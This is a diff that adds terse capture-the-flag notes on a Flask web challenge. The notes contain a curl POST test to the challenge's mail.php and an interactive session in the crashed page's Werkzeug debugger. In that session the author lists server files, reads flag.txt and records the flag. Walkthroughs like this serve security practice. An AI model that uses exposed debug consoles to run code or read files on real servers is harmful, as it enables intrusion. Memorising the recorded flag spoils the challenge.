@@ -1,0 +1,38 @@
+assert name in [
+                "park",
+                "disney",
+                "beach",
+                "home",
+        ]
+ 
+        if "home" in name:
+		return render_template("home.html") 
+
+uses flask
+bug on URL
+
+mail.php < contact page form <<< JUST A RANDOM THING
+
+post
+
+name
+email
+subject
+message
+
+Try 1.
+curl -d "name=user1&email=abcd&subject=dsf&message=adfdfd" -X POST http://three.jh2i.com:50018/mail.php
+
+
+The crashed page has a debugger
+onlyfiles = [f for f in listdir(os.getcwd()) if isfile(join(os.getcwd(), f))]
+>>> onlyfiles
+['flag.txt', 'main.py', 'requirements.txt']
+>>> f = open("flag.txt", "r")
+>>> f.read()
+'flag{weurkzerg_the_worst_kind_of_debug}'
+>>> 
+
+
+flag{weurkzerg_the_worst_kind_of_debug}
+
